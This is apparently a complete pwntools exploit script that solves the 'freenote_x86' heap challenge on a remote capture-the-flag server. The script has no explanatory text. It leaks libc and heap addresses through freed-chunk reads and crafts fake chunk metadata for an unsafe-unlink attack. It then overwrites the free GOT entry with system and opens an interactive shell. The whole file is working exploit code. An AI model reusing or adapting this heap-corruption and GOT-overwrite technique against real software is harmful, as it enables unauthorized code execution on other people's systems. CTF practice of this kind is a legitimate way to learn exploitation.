from pwn import *

# p = process('./freenote_x86')
p = remote('pwn2.jarvisoj.com', 9885)

def new_note(x):
    p.recvuntil('Your choice: ')
    p.send('2\n')
    p.recvuntil('Length of new note: ')
    p.send(str(len(x))+'\n')
    p.recvuntil('Enter your note: ')
    p.send(x)

def list_note():
    p.recvuntil('Your choice: ')
    p.send('1\n')

def delete_note(x):
    p.recvuntil('Your choice: ')
    p.send('4\n')
    p.recvuntil('Note number: ')
    p.send(str(x)+'\n')

def edit_note(x, y):
    p.recvuntil("Your choice: ")
    p.send("3\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(y)

#####################################leak libc addr#############################

new_note("A")
new_note("B")
delete_note(0)

new_note("AAAA")
list_note()
p.recvuntil('0. ')
leak = p.recvuntil('\n')
leak = leak[4:8]
main_arena_bins_addr = u32(leak) + 0x8

print "main_arena.bins addr = " + hex(main_arena_bins_addr)
delete_note(1)
delete_note(0)


# libc = ELF('./libc-2.19.so')
# print hex(libc.symbols['main_arena'])
#
# system_sh_addr = leaklibcaddr + libc.symbols['system']
# print "system_sh_addr: " + hex(system_sh_addr)
# binsh_addr = leaklibcaddr + next(libc.search('/bin/sh\x00'))
# print "binsh_addr: " + hex(binsh_addr)
# print hex(next(libc.search('/bin/sh\x00')) - libc.symbols['system'])


# system_addr = main_arena_bins_addr - 0x16c148
# binsh_addr = main_arena_bins_addr - 0x498ac
# print "system_addr: " + hex(system_addr)
# print "binsh_addr: " + hex(binsh_addr)

#####################################leak heap addr#############################

new_note('A')
new_note('B')
new_note('C')
new_note('D')
delete_note(2)
delete_note(0)

new_note("AAAA")
list_note()
p.recvuntil('0. ')
leak = u32(p.recvuntil('\n')[4:8])
print "heap address: " + hex(leak)

delete_note(0)
delete_note(1)
delete_note(3)



note_table = leak - 0xc18 + 24
fake_fd = note_table - 12
fake_bk = fake_fd + 4

notelen = 0x80

new_note('A'*notelen)
new_note('B'*notelen)
new_note('C'*notelen)

delete_note(2)
delete_note(1)
delete_note(0)


payload = p32(0x0) + p32(notelen | 0x1) + p32(fake_fd) + p32(fake_bk) + 'A' * (notelen-0x10)
payload += p32(notelen) + p32((notelen+0x08))+'B'*notelen
payload += p32(0) + p32(notelen + 0x9) + 'C'*notelen

print "payload length: %d" % (len(payload))

new_note(payload)

delete_note(1)

freenote_x86 = ELF('./freenote_x86')
free_got = freenote_x86.got['free']
print "free_got: " + hex(free_got)
payload2 = p32(3) + p32(1) + p32(0x4) + p32(free_got) + "A" * 8 + p32(0)
payload2 += "A"* (notelen*3-len(payload2) + 0x10)
# payload2 = p32(3) + p32(1) + p32(0x4) + p32(free_got)
edit_note(0, payload2)
list_note()
p.recvuntil('0. ')
free_addr = u32(p.recvuntil('\n')[0:4])
print "free address: " + hex(free_addr)
libc = ELF('./libc-2.19.so')

offset =  libc.symbols['free'] - libc.symbols['system']
system_addr = free_addr - offset
print 'system address: ' + hex(system_addr)
binsh_addr = free_addr - (libc.symbols['free'] - next(libc.search('/bin/sh\x00')))
edit_note(0, p32(system_addr))

new_note('/bin/sh\x00')
delete_note(33)
p.interactive()
